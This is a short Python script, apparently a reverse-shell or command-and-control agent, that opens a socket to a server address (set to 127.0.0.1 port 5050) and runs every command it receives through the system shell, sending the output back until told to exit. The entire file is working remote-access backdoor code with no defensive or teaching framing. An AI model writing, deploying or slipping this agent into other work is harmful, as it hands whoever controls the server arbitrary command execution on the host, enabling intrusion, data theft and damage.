import socket
import subprocess

SERVER_IP = "127.0.0.1"
PORT = 5050

def start_agent():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    print(f"[*] Connecting to {SERVER_IP}:{PORT}...")
    try:
        s.connect((SERVER_IP, PORT))
        print("[+] Connected!")
    except Exception as e:
        print(f"[!] Connection failed: {e}")
        return

    while True:
        command = s.recv(1024).decode()
        
        if command.lower() == 'exit':
            s.close()
            break
        
        cmd = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        
        output_bytes = cmd.stdout.read() + cmd.stderr.read()
        output_str = output_bytes.decode()
        
        if not output_str:
            output_str = "[*] Command Executed"
            
        s.send(output_str.encode())

if __name__ == "__main__":
    start_agent()